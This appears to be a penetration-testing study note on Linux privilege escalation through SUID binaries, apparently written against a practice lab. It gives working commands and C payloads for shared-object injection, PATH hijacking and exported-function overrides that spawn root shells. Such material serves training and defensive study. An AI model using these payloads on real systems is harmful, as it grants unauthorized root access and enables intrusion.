#Phases/Methodology #PrivEsc 

# SUID

SUID bit enables any user to execute a binary with the permissions of its owner. This can lead to various security vulneribilities with improper use on systems.

[GTFOBins](https://gtfobins.github.io) contains methods to abuse certain SUID binaries for various purposes. Following shell snippet shows how to find SUID binaries on a system;

``` bash
user@host:~$ find / -perm -4000 -ls -type f 2>/dev/null 
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
...
user@host:~$ ls -la /usr/bin/chsh
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
```

Not all binaries are vulnerable to SUID abuse and some binaries have SUID bit set by default.

### with Shared Object Injection
Binaries are linked with libraries/shared objects which provides functionality to the application. Shared object injection aims to overwrite vulnerable shared objects with malicious payloads to be executed by the application.

`strace` can be used to locate shared objects that a binary is trying to access at execution;

``` bash
user@host:~$ find / -perm -4000 -ls -type f 2>/dev/null 
...
/usr/local/bin/suid-so
...
user@host:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
user@host:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i "no such file"
...
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory) # vulnerable shared object
```

Following payload can be used with SUID binaries (as shown above) to spawn an escalated shell instance;

``` c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile the payload with;

``` bash
gcc -shared -fPIC -o /path/to/vulnerable/object.so payload.c
```

Once the binary is executed, the payload will activate and provide us a root shell.

### with Environment Variables (PATH)
PATH is a system environment variable which contains directories in a system where executable programs are located. This allows the system execute programs by calling its name without expicitly calling its absolute path.

PATH variable usually contains multiple directories declared on single string with a seperator ("`:`"). The system searches all directories inorder until it finds the executable. `export`, a reserved shell command, can be used to add new directories to PATH (*it is temporary*) which will append new directories to the **beginning** of the PATH string. This can be abused in some interesting ways.

#### *Case 01*:
``` bash
user@host:~$ find / -type f -perm -4000 -ls 2>/dev/null 
...
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env01
...
user@host:~$ strings /usr/local/bin/suid-env01
...
service apache2 start # calls "service" to start "apache2" service
user@host:~$ which service
/usr/sbin/service
user@host:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
```

"**`suid-env`**" which has its SUID also set, calls "**`service`**" to execute a command. In the case, PATH can be manipulated to execute a malicous payload;

``` bash
user@host:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c # Making a payload to spawn a shell
user@host:~$ gcc -o /tmp/service /tmp/service.c # Compiling
user@host:~$ export PATH=/tmp:$PATH # Add to PATH
user@host:~$ /usr/local/bin/suid-env01
root@host:~\# whoami # Rooted
root
root@host:~\# exit
exit
user@host:~$ which service
/tmp/service
user@host:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
```

As shown above, PATH was manipulated to execute the malicious "**`service`**" to spawn a root shell.

#### *Case 02*:
``` bash
user@host:~$ find / -type f -perm -4000 -ls 2>/dev/null 
...
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env02
...
user@host:~$ strings /usr/local/bin/suid-env02
...
/usr/sbin/service apache2 start # calls "service" by its absolute path
```

``` bash
user@host:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
user@host:~$ export -f /usr/sbin/service
user@host:~$ /usr/local/bin/suid-env2
root@host:~\# whoami
root
root@host:~\#
```

### Other
- [CVE-2016-1247](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

